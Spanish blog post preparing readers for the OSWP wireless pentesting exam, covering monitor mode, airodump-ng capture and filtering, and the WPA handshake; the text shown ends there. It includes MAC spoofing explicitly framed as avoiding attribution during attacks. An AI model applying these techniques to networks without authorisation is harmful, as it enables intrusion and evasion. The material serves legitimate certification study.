---
title: PreparaciÃ³n OSWP
excerpt: "Para aquellos interesados en certificarse de OSWP, por aquÃ­ os dejo una guÃ­a hecha por mi donde de manera desglosada comentamos cada uno de los puntos importantes a tener en cuenta de cara a la examinaciÃ³n."
date: 2020-02-04
classes: wide
header:
  teaser: /assets/images/oswp-preparation/oswp-logo.png
  teaser_home_page: true
categories:
  - Certificaciones
tags:
  - OSWP
  - Offensive Security
  - Pentesting
  - Examen
  - GuÃ­as
---

# PreparaciÃ³n para el OSWP (by s4vitar)

![OSWP Image](https://funkyimg.com/i/2VTJW.jpg)
#### Offensive Security Wireless Attacks (WiFu) course and Offensive Security Wireless Professional (OSWP) Cheat Sheet

<br>
Esta guÃ­a es la misma que tengo publicada en mi Gist:

* [https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb](https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb)

## Ãndice y Estructura Principal
- [Antecedentes - Experiencia Personal](#Antecedentes)
- [Estructura de los apuntes](#estructura-de-los-apuntes)
     * [Redes WPA](#redes-wpa)
       * [Conceptos bÃ¡sicos](#conceptos-bÃ¡sicos)
       * [Modo monitor](#modo-monitor)
       * [ConfiguraciÃ³n de la tarjeta de red y tips](#configuraciÃ³n-de-la-tarjeta-de-red-y-tips)
       * [AnÃ¡lisis del entorno](#anÃ¡lisis-del-entorno)
       * [Modos de filtro](#modos-de-filtro)
       * [ExportaciÃ³n de evidencias](#exportaciÃ³n-de-evidencias)
       * [Concepto de Handshake](#concepto-de-handshake)
       * [TÃ©cnicas para capturar un Handshake](#tÃ©cnicas-para-capturar-un-handshake)
            * [Ataque de DeautenticaciÃ³n dirigido](#ataque-de-deautenticaciÃ³n-dirigido)
            * [Ataque de DeautenticaciÃ³n global (Broadcast MAC Address)](#ataque-de-deautenticaciÃ³n-global)
            * [Ataque de AutenticaciÃ³n](#ataque-de-autenticaciÃ³n)
            * [CTS Frame Attack - Secuestro del Ancho de Banda](#cts-frame-attack)
            * [Beacon Flood Mode Attack](#beacon-flood-mode-attack)
            * [Disassociation Amok Mode Attack](#disassociation-amok-mode-attack)
            * [Michael Shutdown Exploitation](#michael-shutdown-exploitation)
            * [TÃ©cnicas pasivas](#tÃ©cnicas-pasivas)
        * [ValidaciÃ³n del Handshake con Pyrit](#validaciÃ³n-del-handshake-con-pyrit)
        * [Tratamiento y filtro de la captura](#tratamiento-y-filtro-de-la-captura)
        * [Parseador para redes del entorno](#parseador-para-redes-del-entorno)
        * [AnÃ¡lisis de paquetes de red con Tshark](#anÃ¡lisis-de-paquetes-de-red-con-tshark)
        * [ExtracciÃ³n del hash en el Handshake](#extracciÃ³n-del-hash-en-el-handshake)
        * [Fuerza bruta con John](#fuerza-bruta-con-john)
        * [Fuerza bruta con Aircrack](#fuerza-bruta-con-aircrack)
        * [Fuerza bruta con Hashcat](#fuerza-bruta-con-hashcat)
        * [Proceso de ataque con Bettercap](#proceso-de-ataque-con-bettercap)
        * [TÃ©cnicas de aumento de la velocidad de cÃ³mputo](#tÃ©cnicas-de-aumento-de-la-velocidad-de-cÃ³mputo)
            * [Concepto de Rainbow Table](#concepto-de-rainbow-table)
            * [Cracking con Pyrit](#cracking-con-pyrit)
            * [Cracking con Cowpatty](#cracking-con-cowpatty)
            * [Cracking con Airolib](#cracking-con-airolib)
            * [Rainbow Table con GenPMK](#rainbow-table-con-genpmk)
            * [Cracking con Cowpatty frente a Rainbow Table](#cracking-con-cowpatty-frente-a-rainbow-table)
            * [Cracking con Pyrit frente a Rainbow Table](#cracking-con-pyrit-frente-a-rainbow-table)
            * [Cracking con Pyrit a travÃ©s de ataque por base de datos](#cracking-con-pyrit-a-travÃ©s-de-ataque-por-base-de-datos)
        * [TÃ©cnicas de espionaje](#tÃ©cnicas-de-espionaje)
            * [Uso de Airdecap para el desencriptado de paquetes](#uso-de-airdecap-para-el-desencriptado-de-paquetes)
            * [AnÃ¡lisis del desencriptado con Tshark y Wireshark](#anÃ¡lisis-del-desencriptado-con-tshark-y-wireshark)
            * [Espionaje con Ettercap Driftnet y enrutamiento con iptables](#espionaje-con-ettercap-driftnet-y-enrutamiento-con-iptables)
        * [Ataques graciosos](#ataques-graciosos)
            * [Reemplazado de imÃ¡genes web](#reemplazado-de-imÃ¡genes-web)
            * [Ataque Shaking Web](#ataque-shaking-web)
        * [Evil Twin Attack](#evil-twin-attack)
           * [CreaciÃ³n de fichero DHCP](#creaciÃ³n-de-fichero-dhcp)
           * [ConfiguraciÃ³n de pÃ¡gina web](#configuraciÃ³n-de-pÃ¡gina-web)
           * [InicializaciÃ³n de servicios](#inicializaciÃ³n-de-servicios)
           * [CreaciÃ³n de base de datos via MYSQL](#creaciÃ³n-de-base-de-datos-via-mysql)
           * [CreaciÃ³n de falso punto de acceso via Airbase](#creaciÃ³n-de-falso-punto-de-acceso-via-airbase)
           * [CreaciÃ³n de interfaz y asignaciÃ³n de segmentos](#craciÃ³n-de-interfaz-y-asignaciÃ³n-de-segmentos)
           * [Control y creaciÃ³n de reglas de enrutamiento por iptables](#control-y-creaciÃ³n-de-reglas-de-enrutamiento-por-iptables)
           * [SincronizaciÃ³n de reglas definidas con el Fake AP](#sincronizaciÃ³n-de-reglas-definidas-con-el-fake-ap)
           * [Robo de datos](#robo-de-datos)
        * [Ataque a redes sin clientes](#ataque-a-redes-sin-clientes)
            * [Clientless PKMID Attack](#clientless-pkmid-attack)
                * [Ataque desde Bettercap](#ataque-desde-bettercap)
                * [Ataque via hcxdumptool](#ataque-via-hcxdumptool)
                * [Uso de hcxpcaptool](#uso-de-hcxpcaptool)
        * [Ataques por WPS](#ataques-por-wps)
            * [Uso de Wifimosys](#uso-de-wifimosys)
        * [Redes WPA Ocultas](#redes-wpa-ocultas)       
    * [Redes WEP](#redes-wep)
        * [Fake Authentication Attack](#fake-authentication-attack) 
        * [ARP Replay Attack](#arp-replay-attack) 
        * [Chop Chop Attack](#chop-chop-attack) 
        * [Fragmentation Attack](#fragmentation-attack) 
        * [SKA Type Cracking](#ska-type-cracking) 

            
       

Antecedentes
===============================================================================================================================
Antes que nada me gustarÃ­a comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le
sirva de inspiraciÃ³n para aquel que pretenda sacarse la certificaciÃ³n.

#### Â¿Es difÃ­cil la certificaciÃ³n?

![Certificado FÃ­sico](https://funkyimg.com/i/2VTgJ.jpeg)

A diferencia del OSCP, encontrÃ© bastante sencillo el curso, pero todo tiene su explicaciÃ³n. 

Cuando empecÃ© con el Hacking, lo primero que toquÃ© fue la parte WiFi, por lo que esta parte la tenÃ­a mÃ¡s que
controlada antes de empezar. En cuanto a aprendizaje, aprendÃ­ una o dos cosas nuevas, lo cual es
excitante, pero a groso modo os puedo decir que por mi cuenta de manera autodidacta abarquÃ© mucho mÃ¡s temario
del que presentaba el curso.

Por ello hago este Gist, no sÃ³lo para comentar las tÃ©cnicas que necesitÃ¡is tener controladas, sino para
enseÃ±aros un par de trucos y vectores de ataque que no estÃ¡n de mÃ¡s guardarlos bajo la manga.

#### Â¿QuÃ© plan me pillo?

En mi caso me pillÃ© un mes de curso, pero al tercer dÃ­a de pagarlo me presentÃ© al examen. Para aquellos que no
estÃ©n experimentados con la temÃ¡tica WiFi, os puedo decir que con un mes tenÃ©is de sobra, ya que no requiere
tanta dedicaciÃ³n como el OSCP.

Eso sÃ­, hay multitud de comandos y distintos casos, por lo que sobra decir que practicar siempre hay que
practicar. 

En este caso el curso no dispone de laboratorio, por lo que serÃ¡ necesario montarse un laboratorio
en local donde practicar los distintos casos. Para los interesados, todos los laboratorios los montÃ© con un
'**TP-Link**', un simple repetidor desde el cual podÃ­a configurar si la red querÃ­a que fuera de protocolo WPA
o de protocolo WEP con sus distintos modos de autenticaciÃ³n.

#### Â¿QuÃ© bases tuve antes de comenzar con la certificaciÃ³n?

Como dije anteriormente, tenÃ­a altamente controlada la parte WiFi, por lo que el estudio de los ataques a
redes WPA y WEP no supuso ningÃºn problema. La guÃ­a que te entregan junto a los vÃ­deos estÃ¡n perfectamente
estructurados, y cuentas con todo lo necesario para enfrentarte al examen.

#### Â¿QuÃ© pasos me recomiendas para abordar con Ã©xito la certificaciÃ³n?

Recomiendo montar un laboratorio en local para practicar todos los vectores de ataque vistos durante el curso.

Para abordar con Ã©xito la certificaciÃ³n, es necesario que sepas al dedillo cÃ³mo manejarte en las siguientes
situaciones, siguiendo como objetivo obtener la contraseÃ±a del punto de acceso inalÃ¡mbrico:

* Ataques a redes WPA con autenticaciÃ³n PSK
* Ataques a redes WEP con clientes sin autenticaciÃ³n SKA
* Ataques a redes WEP con clientes y autenticaciÃ³n SKA
* Ataques a redes WEP sin clientes

Ahora bien, para cada caso, hay distintas formas de efectuar el procedimiento, ya que depende a su vez del
trÃ¡fico de la red, la calidad de los paquetes capturados y distintos factores.

#### Â¿CÃ³mo estÃ¡ estructurado el examen?

El examen tiene una duraciÃ³n de cuatro horas, te conectas a una mÃ¡quina por VPN la cual dispone de una tarjeta
de red configurada y a partir de ahÃ­ escaneas el entorno.

En el entorno, hay un total de tres puntos de acceso que debes vulnerar, cada uno de ellos representando un
caso diferente. Para aprobar el examen, debes averiguar la contraseÃ±a de los tres AP's, pues en caso contrario
no te aprueban.

La gran pregunta, Â¿son cuatro horas suficientes?, mi respuesta es mÃ¡s que suficiente. En mi caso en una media
hora aproximada ya habÃ­a terminado el examen (lo cual me sorprendiÃ³). Recomiendo tener todos los comandos
apuntados para cada caso, eso os permitirÃ¡ ir a tiro hecho.

#### Â¿Tuve problemas a la hora de practicar con el laboratorio en local?

Como dije anteriormente, esta certificaciÃ³n no dispone de laboratorio, lo que te obliga a montarte tu propio
laboratorio en local para practicar.

Los Ãºnicos ataques que no pude replicar fueron el **Chop Chop de Korek** y el **Fragmentation Attack**,
empleado para redes que no disponen de clientes asociados. Este mismo problema lo he visto en mÃ¡s gente,
leyendo en artÃ­culos donde detallaban el mismo inconveniente. Al parecer depende del modelo de router que
tengas. 

En la web de Offensive se cita el modelo a usar para practicar los vectores de ataque, pero como
comprenderÃ©is, no iba a gastar dinero por poder hacer dos ataques. Por lo demÃ¡s, el resto de ataque los pude
replicar correctamente.

#### Â¿CuÃ¡les son los siguientes pasos?

La siguiente certificaciÃ³n que me estoy preparando es el **eWPT**, una certificaciÃ³n de Pentesting Web
bastante valorada y orientada a Bug Bounty. Si me animo puede que mate dos pÃ¡jaros de un tiro y tras tenerla
pruebe a hacer el **AWAE** de Offensive Security, ya que estarÃ© bien fresco de ideas una vez finalice el otro.

Por si os interesa, el **eWPT** dispone de un plan (que es el que he pagado) que os permite tener un
laboratorio de mÃ¡quinas de por vida sobre los que practicar Pentesting Web, el cual os actualizan
frecuentemente.

Estructura de los apuntes
===============================================================================================================================

Para facilitar la reparticiÃ³n de apuntes, intuyo que es buena idea dividirlo por un lado en ataques a redes
WPA y por otro lado en ataques a redes WEP con sus distintos casos, Â¡asÃ­ que asÃ­ lo haremos Mike!

## Redes WPA
Este apartado engloba todos los vectores de ataque y tÃ©cnicas ofensivas destinadas al protocolo WPA.

### Conceptos bÃ¡sicos

Hay que aclarar una serie de conceptos clave antes de empezar. La mayorÃ­a de los ataques que vamos a ver,
ademÃ¡s de en ocasiones servir para molestar... van destinados a obtener la contraseÃ±a de una red inalÃ¡mbrica.

El por quÃ© es necesario realizar un ataque para obtener la contraseÃ±a es algo que veremos en los siguientes
puntos. Hay que tener en cuenta que al tratarse de una autenticaciÃ³n de tipo PSK (Pre-Shared-Key), se estÃ¡
haciendo uso de una clave pre-compartida como su nombre indica, una contraseÃ±a Ãºnica que de estar a
disposiciÃ³n de cualquiera puede ser usada para llevar a cabo una asociaciÃ³n contra el AP.

A la hora de llevar a cabo una asociaciÃ³n por una estaciÃ³n (**cliente**) contra el AP, se deja un rastro a
nivel de paquetes (eapol), los cuales como atacante, pueden ser capturados y tratados sin estar autenticados
al punto de acceso para posteriormente extraer la contraseÃ±a de la red inalÃ¡mbrica.

Todo esto explicado de una manera no tÃ©cnica para no entrar en materia tan rÃ¡pido, ya a medida que vayamos
avanzando se irÃ¡ analizando mas a bajo nivel cÃ³mo funciona todo :)

### Modo monitor

Hay que pensar que estamos rodeados de paquetes por todos lados, paquetes que no somos capaces de percibir,
paquetes que contienen informaciÃ³n del entorno por el que nos movemos. 

Estos paquetes pueden ser capturados con tarjetas de red que acepten el modo monitor. El **modo monitor**, no
es mÃ¡s que un modo por el cual podemos escuchar y capturar todos los paquetes que viajen por el aire. Tal vez
lo mejor de todo es que no sÃ³lo podemos capturarlos, sino tambiÃ©n manipularlos (veremos algunos ataques
interesantes mÃ¡s adelante).

Para comprobar si nuestra tarjeta de red acepta el modo monitor, haremos una prueba en el siguiente apartado.

### ConfiguraciÃ³n de la tarjeta de red y tips

Empecemos con un par de comandos bÃ¡sicos. A continuaciÃ³n os listo mi tarjeta de red:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ifconfig wlan0
wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.187  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::1d28:6b2b:a941:5796  prefixlen 64  scopeid 0x20<link>
        ether e4:70:b8:d3:93:5d  txqueuelen 1000  (Ethernet)
        RX packets 6426576  bytes 9229384163 (8.5 GiB)
        RX errors 0  dropped 5  overruns 0  frame 0
        TX packets 1160899  bytes 162727829 (155.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Espero que a partir de ahora os llevÃ©is bien con ella, pues con esta practicaremos la mayorÃ­a de ataques.

Para poner en modo monitor nuestra tarjeta de red, es tan simple como aplicar el siguiente comando:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #airmon-ng start wlan0

Found 5 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

  PID Name
  818 avahi-daemon
  835 wpa_supplicant
  877 avahi-daemon
 5398 NetworkManager
18308 dhclient

PHY	Interface	Driver		Chipset

phy0	wlan0		iwlwifi		Intel Corporation Wireless 7265 (rev 61)

		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)
```

Ahora bien, cosas a tener en cuenta. Cuando estamos en modo monitor, perdemos conectividad a internet. Este
modo no admite conexiÃ³n a internet, por lo que no os asustÃ©is si de pronto veis que no podÃ©is navegar. Veremos
cÃ³mo deshabilitar este modo para que todo vuelva a la normalidad.

Cabe decir que al iniciar este modo, se generan una serie de **procesos conflictivos**. Esto es asÃ­ dado que
por ejemplo, si no vamos a tener acceso a internet... Â¿por quÃ© tener corriendo los procesos '**dhclient**' y
'**wpa_supplicant**'?, es algo absurdo, e incluso la propia suite nos lo recuerda... pues se encargan de darnos
conectividad y mantenernos con conexiÃ³n en una red ya estando asociados, lo cual en este caso... no aplica.

Matar estos procesos es sencillo, tenemos la siguiente forma:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pkill dhclient && pkill wpa_supplicant
```

O si deseamos tirar de la propia suite:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #airmon-ng check kill

Killing these processes:

  PID Name
  835 wpa_supplicant
```

Ya con esto, nuestra tarjeta de red estÃ¡ en modo monitor. Una forma de comprobar si estamos en modo monitor es
listando nuestras interfaces de red. Ahora nuestra red **wlan0** deberÃ­a llamarse **wlan0mon**:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ifconfig | grep wlan0 -A 6
wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec E4-70-B8-D3-93-5C-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 63  bytes 12032 (11.7 KiB)
        RX errors 0  dropped 63  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Una vez llegados a este punto, se podrÃ­a decir que ya somos capaces de capturar todos los paquetes que viajan
por nuestro alrededor, pero dejaremos esto para el siguiente punto.

Importante, Â¿cÃ³mo desactivar el modo monitor y hacer que todo vuelva a la normalidad en tÃ©rminos de
conectividad?, sencillo. Podemos hacer uso de los siguientes comandos para restablecer la conexiÃ³n:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #airmon-ng stop wlan0mon && service network-manager restart

PHY	Interface	Driver		Chipset

phy0	wlan0mon	iwlwifi		Intel Corporation Wireless 7265 (rev 61)

		(mac80211 station mode vif enabled on [phy0]wlan0)

		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)

â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ping -c 10 -i 0.01 -q google.es
PING google.es (172.217.17.3) 56(84) bytes of data.

--- google.es ping statistics ---
10 packets transmitted, 10 received, 0% packet loss, time 309ms
rtt min/avg/max/mdev = 28.718/29.565/29.985/0.427 ms, pipe 3
```

Por lo que fuera malestares y preocupaciones, no hay que tirar el ordenador a la basura. 

Pero esto no es suficiente. A pesar de no estar conectados a ninguna red y no disponer de direccion IP, lo que
en sÃ­ puede dejar rastro es nuestra direcciÃ³n MAC. 

La direcciÃ³n MAC al fin y al cabo es como el DNI de cada dispositivo, es lo que identifica un dispositivo
mÃ³vil, un router, un ordenador, etc. SerÃ­a feo estar haciendo cierto tipo de ataques actuando bajo una
direcciÃ³n MAC que se nos asocie, es lo equivalente a hacer un atraco con pasamontaÃ±as pero llevar una cartera
con nuestro DNI dentro del bolsillo y que en un descuido se nos caiga al suelo quedando a la exposiciÃ³n de
todos los demÃ¡s.

Una buena practica consiste en falsificar la direcciÃ³n MAC, y no hace falta saber de electrÃ³nica o Hardware
para ello. A travÃ©s de la utilidad **macchanger**, podemos jugar con la direcciÃ³n MAC de nuestro dispositivo
para manipularla a nuestro antojo.

Por ejemplo, imaginemos que quiero asignar a mi tarjeta de red una direcciÃ³n MAC de la **NATIONAL SECURITY
AGENCY** (**NSA**), Â¿cÃ³mo se procederÃ­a?. Primero buscamos la direcciÃ³n MAC en el amplio listado del que
dispone 'macchanger':

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #macchanger -l | grep -i "national security agency"
8310 - 00:20:91 - J125, NATIONAL SECURITY AGENCY
```
Estos tres primeros pares listados corresponden a lo que se conoce como **Organizationally Unique
Identifier**, un simple nÃºmero de 24 bits que identifica al vendor, manufacturer u otra organizaciÃ³n.

Una direcciÃ³n MAC estÃ¡ compuesta por 6 bytes, ya tenemos los primeros 3 bytes, Â¿quÃ© hay de los otros 3 bytes?.
Los 24 bits restantes corresponden a lo que se conoce como **Universally Administered Address**, y sinceramente...
en mis prÃ¡cticas, siempre me la invento.

Es decir, que si quisiera falsificar una direcciÃ³n MAC registrada bajo el **OUI** de la NSA, podrÃ­a hacer lo
siguiente:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ifconfig wlan0mon down
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #echo "$(macchanger -l | grep -i "national security agency" | awk '{print $3}'):da:1b:6a"
00:20:91:da:1b:6a
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #macchanger --mac=$(!!) wlan0mon
Current MAC:   e4:70:b8:d3:93:5c (unknown)
Permanent MAC: e4:70:b8:d3:93:5c (unknown)
New MAC:       00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ifconfig wlan0mon up
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #macchanger -s wlan0mon
Current MAC:   00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
Permanent MAC: e4:70:b8:d3:93:5c (unknown)
```

Aspectos a tener en cuenta de lo anterior:

* Es necesario dar de baja la interfaz de red para manipular su direcciÃ³n MAC, pues de lo contrario el propio
  'macchanger' nos avisarÃ¡ de que es necesario darla de baja.

* Con la utilidad '--mac', podemos especificar la direcciÃ³n MAC a utilizar para la interfaz de red
  especificada.

* Una vez aplicados los cambios, damos de alta la interfaz y con el parÃ¡metro '-s' (**show**), validamos que
  nuestra tarjeta de red corresponde al **OUI** asignado.

Perfecto, si has llegado a este punto podemos continuar.

### AnÃ¡lisis del entorno

Llega el momento interesante. Ahora que estamos en modo monitor, para capturar todos los paquetes de nuestro
alrededor, podemos hacer uso del siguiente comando:

```bash
airodump-ng wlan0mon
```

**IMPORTANTE**: Aunque tal vez lo deberÃ­a haber mencionado en el anterior punto, no todas las tarjetas de red
tienen por quÃ© llamarse **wlan0**, pueden tener un nombre distinto (Ej: **wlp2s0**), por lo que habrÃ¡ que
tener en cuenta su nombre para acompaÃ±arlo junto al comando a aplicar.

Al correr el comando citado anteriormente, obtenemos el siguiente resultado:

```bash
 CH 13 ][ Elapsed: 18 s ][ 2019-08-05 13:34                                         
                                                                                                                                                                                       
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -20       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      
 1C:B0:44:D4:16:78  -59       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                
 30:D3:2D:58:3C:6B  -79       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          
 10:62:D0:F6:F7:D8  -81       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     
 F8:8E:85:DF:3E:13  -85       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        
 FC:B4:E6:99:A9:09  -85       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                
 28:9E:FC:0C:40:3E  -90        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                        
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -27    0 - 2e     0        1                                
```

Entonces bien, Â¿cÃ³mo se interpreta este output?. 

De los campos mÃ¡s importantes por el momento, por un lado tenemos el campo **BSSID**, donde siempre podremos
corroborar cuÃ¡l es la direcciÃ³n MAC del punto de acceso. Por otro lado, contamos con el campo **PWR**, donde a
modo de consideraciÃ³n, a mÃ¡s cerca estÃ© del valor 0, podremos decir que mÃ¡s cerca nos situamos del AP.

El campo **CH**, indica el canal en el que se sitÃºa el AP. Cada AP, estÃ¡ posicionado en un canal distinto, con
el objetivo de evitar que se daÃ±e el espectro de onda entre las mÃºltiples redes del entorno. Existe un ataque
justamente de denegaciÃ³n de servicio, que se encarga de generar mÃºltiples Fake AP's situados en el mismo canal
que en el del AP objetivo, consiguiendo asÃ­ que la red queda inoperativa temporalmente (lo veremos mÃ¡s
adelante).

Por otro lado, los campos **ENC, CIPHER** y **AUTH**, donde podremos comprobar siempre con quÃ© tipo de red
estamos tratando. La mayorÃ­a de redes domÃ©sticas cumplen la encriptaciÃ³n WPA/WPA, con cifrado CCMP y modo de
autenticaciÃ³n PSK.

En el campo **ESSID**, podremos siempre saber el nombre de la red con la que estamos tratando, pudiendo asÃ­ en
una misma lÃ­nea a travÃ©s del campo **BSSID** saber cuÃ¡l es su direcciÃ³n MAC, de utilidad para cuando
comencemos con la fase de filtrado.

El campo **DATA**, por el momento no lo tocaremos, ya que nos meteremos a fondo con este cuando tratemos las
redes de protocolo **WEP**. 

Asimismo, en la parte inferior, podemos ver otros datos que estÃ¡n siendo capturados con la herramienta. Esta
secciÃ³n corresponde a la de los clientes. Consideraremos una estaciÃ³n como un cliente asociado. Para el
ejemplo mostrado, existe una estaciÃ³n con direcciÃ³n MAC **34:41:5D:46:D1:38** asociado al **BSSID**
'20:34:FB:B1:C5:53', donde de manera inmediata en la parte superior podemos ver que se trata de la red
**hacklab**, por lo que ya sabemos que dicha red cuenta con un cliente asociado.

Es posible que en ocasiones lleguemos a capturar estaciones que no estÃ¡n asociadas a ningÃºn punto de acceso,
el cual en este caso se indicarÃ¡ con un '**not associated**' en el campo **BSSID**. Es a travÃ©s del campo
**Frames** de las estaciones, donde podremos ver quÃ© tipo de actividad tiene el cliente sobre dicho AP. Si los
Frames aumentan considerablemente a intervalos cortos de tiempo, esto quiere decir que la estaciÃ³n se
encuentra activa en el momento de la captura.

### Modos de filtro

Aunque es una maravilla poder capturar todos los AP's y estaciones de nuestro entorno, como atacante siempre
nos interesarÃ¡ atentar contra un AP especÃ­fico. Por ello, introducimos en este punto los modos de filtro
disponibles desde la herramienta para capturar aquellos puntos de acceso deseados.

Volvamos al caso de antes:

```bash
 CH 13 ][ Elapsed: 18 s ][ 2019-08-05 13:34                                         
                                                                                                                                                                                       
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -20       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      
 1C:B0:44:D4:16:78  -59       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                
 30:D3:2D:58:3C:6B  -79       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          
 10:62:D0:F6:F7:D8  -81       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     
 F8:8E:85:DF:3E:13  -85       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        
 FC:B4:E6:99:A9:09  -85       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                
 28:9E:FC:0C:40:3E  -90        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                        
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -27    0 - 2e     0        1  
 ```

 Imaginemos que queremos filtrar para que sÃ³lo se lista el punto de acceso cuyo **ESSID** es **hacklab**, Â¿quÃ©
 podemos recaudar de primeras de esta red?

 * El AP se sitÃºa en el canal 1
 * El AP posee direcciÃ³n MAC  20:34:FB:B1:C5:53
 * El AP posee ESSID hacklab

Generalmente con 2 datos ya es suficiente para llevar a cabo el filtro. Para este caso, podrÃ­amos filtrar la
red en cuestiÃ³n de las siguientes formas:

* airodump-ng -c 1 --essid hacklab wlan0mon
* airodump-ng -c 1 --bssid  20:34:FB:B1:C5:53 wlan0mon
* airodump-ng -c 1 --bssid  20:34:FB:B1:C5:53 --essid hacklab wlan0mon

Para cualquiera de las formas representadas, obtendrÃ­amos los siguientes resultados:

```bash
 CH  1 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -26 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -26    0e- 6e     0        9                 
```

### ExportaciÃ³n de evidencias

Ahora bien, a efectos prÃ¡cticos, nos encontramos en la misma situaciÃ³n que al principio. Como atacantes, lo
que nos interesa siempre es recolectar la informaciÃ³n del AP objetivo. En este caso, estamos monitorizando el
trÃ¡fico del AP **hacklab**, pero sin generar evidencias.

Resulta mÃ¡s interesante capturar y exportar todo el trÃ¡fico que se monitorea a un fichero, con el propÃ³sito de
posteriormente poder analizarlo. Para ello se hace uso de la misma sintaxis pero incorporando el parÃ¡metro
'**-w**', donde seguidamente especificamos el nombre del fichero:

* airodump-ng -c 1 -w Captura --essid hacklab wlan0mon
* airodump-ng -c 1 -w Captura --bssid  20:34:FB:B1:C5:53 wlan0mon
* airodump-ng -c 1 -w Captura --bssid  20:34:FB:B1:C5:53 --essid hacklab wlan0mon

De esta forma, una vez comienza el escaneo, se generan los siguientes ficheros en nuestro directorio de
trabajo:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ls
Captura-01.cap  Captura-01.csv  Captura-01.kismet.csv  Captura-01.kismet.netxml  Captura-01.log.csv
```
Realmente, de todos estos ficheros, con el que la gran mayorÃ­a de veces trabajaremos es con el que tiene
extensiÃ³n '.cap', esto es asÃ­ dando que es el que contendrÃ¡ el ** Handshake** capturado, con el que trataremos
en breve.

### Concepto de Handshake

Por cada vez que una estaciÃ³n se asocia o re-asocia a un AP, durante el proceso de asociaciÃ³n viaja la
contraseÃ±a del AP encriptada. A efectos prÃ¡cticos, se dice siempre que el **Handshake** en estos casos se
genera en el momento en el que un cliente se re-conecta a la red. 

Como estamos monitorizando todo el trÃ¡fico de la red en un fichero... viene de maravilla capturar una
re-asociaciÃ³n, pues esta autenticaciÃ³n dejarÃ¡ rastro en nuestra captura y seremos capaces de visualizar la
contraseÃ±a encriptada de la red.

